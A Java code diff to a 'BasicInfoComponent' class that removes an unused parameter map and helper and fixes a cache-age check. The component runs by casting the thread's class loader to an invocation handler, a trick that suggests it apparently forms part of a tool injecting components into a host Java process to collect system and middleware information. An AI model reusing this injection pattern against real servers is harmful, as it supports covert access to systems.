@@ -62,14 +62,13 @@ public class BasicInfoComponent implements Runnable {
     private ClassLoader currentThreadClassLoader;
 
     // 组件接口字段
-    private HashMap<String, Object> params;
     private HashMap<String, Object> results;
 
     
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
-            params = copyStringObjectMap(h.invoke(null, null, null));
+            h.invoke(null, null, null);
             results = new java.util.HashMap<String, Object>();
             invoke();
         } catch (Throwable t) {
@@ -180,7 +179,8 @@ public class BasicInfoComponent implements Runnable {
      */
     public Map<String, Object> getMiddlewareInfo() {
         long now = System.currentTimeMillis();
-        if (middlewareInfo != null && (now - middlewareCacheTime) < MIDDLEWARE_CACHE_TTL_MS) {
+        long cacheAge = now - middlewareCacheTime;
+        if (middlewareInfo != null && cacheAge >= 0 && cacheAge < MIDDLEWARE_CACHE_TTL_MS) {
             return new HashMap<String, Object>(middlewareInfo);
         }
 
@@ -679,17 +679,4 @@ public class BasicInfoComponent implements Runnable {
         return "Unknown";
     }
 
-    private static HashMap<String, Object> copyStringObjectMap(Object value) {
-        HashMap<String, Object> copy = new HashMap<String, Object>();
-        if (!(value instanceof Map)) {
-            return copy;
-        }
-        Map<?, ?> source = (Map<?, ?>) value;
-        for (Map.Entry<?, ?> entry : source.entrySet()) {
-            if (entry.getKey() instanceof String) {
-                copy.put((String) entry.getKey(), entry.getValue());
-            }
-        }
-        return copy;
-    }
 }
